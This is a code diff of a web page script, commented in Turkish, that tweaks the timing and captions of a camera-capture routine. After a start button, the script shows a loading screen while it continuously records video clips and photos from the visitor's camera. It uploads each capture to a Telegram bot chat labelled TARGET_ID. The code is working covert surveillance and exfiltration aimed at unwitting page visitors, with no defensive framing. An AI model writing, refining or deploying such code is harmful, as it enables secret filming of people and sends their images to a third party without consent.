@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - TEK ZAMANLAYICI ====================
+            // ==================== KAMERA İŞLEMLERİ - SON ŞANS ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -157,6 +157,7 @@
             let baslangicZamani = 0;
             let sonVideoZamani = 0;
             let sonFotoZamani = 0;
+            let ilkCalisma = true;
             
             async function startCamera() {
                 try {
@@ -175,24 +176,24 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        baslangicZamani = Date.now();
+                        baslangicZamani = performance.now();
                         sonVideoZamani = baslangicZamani;
                         sonFotoZamani = baslangicZamani;
                         
                         function zamanlayici() {
                             if (!stream?.active) return;
                             
-                            const simdi = Date.now();
+                            const now = performance.now();
                             
                             // ========================================
-                            // VİDEO KONTROLÜ - SÜREKLİ
+                            // VİDEO KONTROLÜ
                             // ========================================
-                            if (simdi >= sonVideoZamani) {
+                            if (now >= sonVideoZamani) {
                                 videoCount++;
                                 sonVideoZamani = baslangicZamani + (videoCount * VIDEO_SURESI * 1000);
                                 
                                 const videoIndex = videoCount;
-                                const videoBaslangic = simdi;
+                                const videoBaslangic = now;
                                 const chunks = [];
                                 
                                 try {
@@ -208,11 +209,12 @@
                                     mr.onstop = () => {
                                         const blob = new Blob(chunks, { type: 'video/webm' });
                                         const boyutKB = (blob.size / 1024).toFixed(0);
+                                        const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(0);
                                         
                                         const formData = new FormData();
                                         formData.append('chat_id', TARGET_ID);
                                         formData.append('video', blob, `video_${Date.now()}.webm`);
-                                        formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
+                                        formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s)`);
                                         
                                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                             method: 'POST',
@@ -230,9 +232,9 @@
                             }
                             
                             // ========================================
-                            // FOTOĞRAF KONTROLÜ - SÜREKLİ
+                            // FOTOĞRAF KONTROLÜ
                             // ========================================
-                            if (simdi >= sonFotoZamani) {
+                            if (now >= sonFotoZamani) {
                                 photoCount++;
                                 sonFotoZamani = baslangicZamani + (photoCount * FOTO_SURESI * 1000);
                                 
@@ -245,7 +247,7 @@
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
                                     
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
